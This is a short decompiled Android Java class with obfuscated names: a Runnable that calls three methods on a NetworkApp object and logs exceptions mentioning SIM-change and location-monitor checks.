package com.network.android.agent;

import com.network.android.c.a.a;

final class d implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ NetworkApp f62a;

    d(NetworkApp networkApp) {
        this.f62a = networkApp;
    }

    public final void run() {
        try {
            this.f62a.c(this.f62a);
            this.f62a.b();
            NetworkApp networkApp = this.f62a;
            NetworkApp.d(this.f62a);
        } catch (Throwable th) {
            a.a("NetworkApp post checkSimChange locationMonitor-  Exception- " + th.getMessage(), th);
        }
    }
}
